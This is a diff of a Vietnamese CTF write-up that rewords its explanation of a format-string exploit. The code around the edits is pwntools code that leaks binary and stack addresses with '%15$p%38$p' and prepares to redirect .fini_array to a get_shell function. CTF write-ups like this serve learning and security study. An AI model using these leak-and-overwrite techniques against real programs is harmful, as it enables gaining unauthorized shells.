@@ -565,7 +565,7 @@ Trong Stack hiện tại leak được 1 địa chỉ binary.
 
 ![Alt text](image/fs41.png)
 
-Leak luôn địa chỉ `rw-` chứa binary base để tí nữa ghi đè lên.
+Leak luôn địa chỉ chứa binary base để tí nữa ghi đè lên.
 
 	p.sendlineafter(b'something: ',b'%15$p%38$p')
 	p.recvuntil(b'said: ')
@@ -578,8 +578,8 @@ Leak luôn địa chỉ `rw-` chứa binary base để tí nữa ghi đè lên.
 	log.info('base_ptr: '+hex(base_pointer))
 	p.sendlineafter('>',b'n')
 
-Vì `.fini_array` này là 1 mảng chứa tập hợp các con trỏ hàm nên không thể trực tiếp ghi đè địa chỉ `get_shell` lên.
-Đầu tiên cần đưa địa `get_shell` vào một phân vùng `rw-`.
+Vì `.fini_array` này là 1 mảng chứa tập hợp các con trỏ hàm nên không thể chuyển hướng trực tiếp địa chỉ `get_shell`.
+Thay vào đó phải thông qua con trỏ. Hãy đưa địa chỉ `get_shell` vào một địa chỉ `rw-`.
 	
 	rw_section=exe.address+0x4048
 	print(hex(rw_section))
